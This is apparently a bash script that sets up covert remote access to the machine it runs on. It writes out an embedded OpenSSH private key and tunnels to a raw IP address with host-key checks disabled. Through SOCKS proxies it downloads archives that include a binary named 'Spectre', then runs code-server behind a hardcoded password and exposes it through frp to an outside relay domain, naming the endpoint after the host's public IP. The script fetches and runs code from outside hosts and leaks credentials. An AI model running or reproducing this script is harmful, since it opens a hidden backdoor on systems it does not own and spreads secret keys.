#!/bin/bash
cd
sleep 2
pwd
sleep 2
cat > sshtunneluser <<END
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
END

sleep 2

chmod 600 sshtunneluser

sleep 2

ssh -i sshtunneluser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 1081:0.0.0.0:8443 -D 1080 sshtunneluser@45.135.57.199

sleep 2

echo "Directory Listing before doing cd"
sleep 2
ls -la
sleep 2

cd
sleep 2
echo "Directory Listing after doing cd"
sleep 2
pwd

sleep 2
ls -la

sleep 4
curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/Spectre.tar.gz -L -O -J

sleep 2
curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/code-server-4.14.1-linux-amd64.tar.gz -L -O -J

sleep 2
curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/frp_0.48.0_linux_amd64.tar.gz -L -O -J

sleep 2
curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/update.tar.gz -L -O -J
sleep 2

tar -xf Spectre.tar.gz

sleep 2

./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@127.0.0.1:1081 &

sleep 2

curl -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

tar -xf update.tar.gz

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1082
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update wget -q -O- http://api.ipify.org

sleep 2

tar -xf code-server-4.14.1-linux-amd64.tar.gz
sleep 2

export PATH=$HOME/code-server-4.14.1-linux-amd64/bin:$PATH
sleep 2

mkdir .config
sleep 2

mkdir .config/code-server
sleep 2

touch .config/code-server/config.yaml
sleep 2

cat > .config/code-server/config.yaml <<END
bind-addr: 127.0.0.1:8080
auth: password
password: IhatePopUpsWut
cert: false
END

sleep 2
cat .config/code-server/config.yaml

sleep 2

tar -xvf frp_0.48.0_linux_amd64.tar.gz
# start from daemon
cp frp_0.48.0_linux_amd64/frpc ~/


sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Dera_')
ipaddress=$(curl -x socks5h://127.0.0.1:1082 -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

randomNumber=$(shuf -i 10000-65000 -n 1)

sleep 2

cat > frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.uk
server_port = 995

[codeserver.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 8080
remote_port = $randomNumber
subdomain = $currentdate

END

sleep 2

echo "Your Codeserver connection details will be $currentdate.emergencyaccess.teatspray.uk:$randomNumber" 

sleep 2

./update/update ./frpc -c frpc.ini &

sleep 2

code-server
